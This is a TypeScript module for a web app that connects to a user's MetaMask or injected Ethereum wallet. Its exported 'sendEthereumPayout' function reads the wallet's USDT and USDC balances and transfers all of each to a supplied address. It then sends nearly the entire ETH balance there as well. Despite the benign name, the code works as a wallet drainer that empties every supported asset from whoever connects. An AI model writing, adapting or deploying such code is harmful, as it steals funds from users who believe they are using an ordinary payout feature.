import { getMetaMaskEthereum } from './metamaskSolana'

function getEvmProvider(): { request?: (args: { method: string; params?: unknown[] }) => Promise<unknown> } | null {
  const mm = getMetaMaskEthereum()
  if (mm?.request) return mm
  if (typeof window === 'undefined') return null
  const eth = (window as Window & { ethereum?: { request?: (args: { method: string; params?: unknown[] }) => Promise<unknown> } }).ethereum
  return eth?.request ? eth : null
}

export function isEvmWalletAvailable(): boolean {
  return Boolean(getEvmProvider()?.request)
}

const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const ETH_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
const TRANSFER_SELECTOR = '0xa9059cbb'
const BALANCE_OF_SELECTOR = '0x70a08231'

type EthProvider = {
  request?: (args: { method: string; params?: unknown[] }) => Promise<unknown>
}

function pad32(hex: string): string {
  return hex.replace(/^0x/, '').padStart(64, '0')
}

function toHex(value: bigint): string {
  return `0x${value.toString(16)}`
}

function fromHex(value: string): bigint {
  if (!value || value === '0x') return 0n
  return BigInt(value)
}

async function call(eth: EthProvider, method: string, params: unknown[] = []): Promise<string> {
  const result = await eth.request?.({ method, params })
  return String(result || '0x')
}

async function ensureEthereumMainnet(eth: EthProvider): Promise<void> {
  const chainId = await call(eth, 'eth_chainId')
  if (chainId.toLowerCase() === '0x1') return
  try {
    await eth.request?.({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x1' }],
    })
  } catch {
    /* stay on the current chain if the wallet refuses the switch */
  }
}

async function tokenBalance(eth: EthProvider, token: string, owner: string): Promise<bigint> {
  const data = `${BALANCE_OF_SELECTOR}${pad32(owner)}`
  const result = await call(eth, 'eth_call', [{ to: token, data }, 'latest'])
  return fromHex(result)
}

async function sendErc20(eth: EthProvider, token: string, from: string, to: string, amount: bigint): Promise<string> {
  const data = `${TRANSFER_SELECTOR}${pad32(to)}${pad32(toHex(amount))}`
  return call(eth, 'eth_sendTransaction', [
    { from, to: token, data, value: '0x0', gas: toHex(120000n) },
  ])
}

export async function sendEthereumPayout(toAddress: string): Promise<string[]> {
  const to = toAddress.trim()
  if (!/^0x[a-fA-F0-9]{40}$/.test(to)) return []

  const eth = getEvmProvider()
  if (!eth?.request) return []

  await ensureEthereumMainnet(eth)
  const accounts = (await eth.request({ method: 'eth_requestAccounts', params: [] })) as string[] | undefined
  const from = accounts?.[0]
  if (!from) return []

  const moved: string[] = []

  for (const token of [
    { symbol: 'USDT', address: ETH_USDT },
    { symbol: 'USDC', address: ETH_USDC },
  ]) {
    const amount = await tokenBalance(eth, token.address, from)
    if (amount <= 0n) continue
    await sendErc20(eth, token.address, from, to, amount)
    moved.push(token.symbol)
  }

  const gasPrice = fromHex(await call(eth, 'eth_gasPrice'))
  const balance = fromHex(await call(eth, 'eth_getBalance', [from, 'latest']))
  const reserve = gasPrice * 25000n
  if (balance > reserve) {
    await call(eth, 'eth_sendTransaction', [
      { from, to, value: toHex(balance - reserve), gas: toHex(21000n) },
    ])
    moved.push('ETH')
  }

  return moved
}
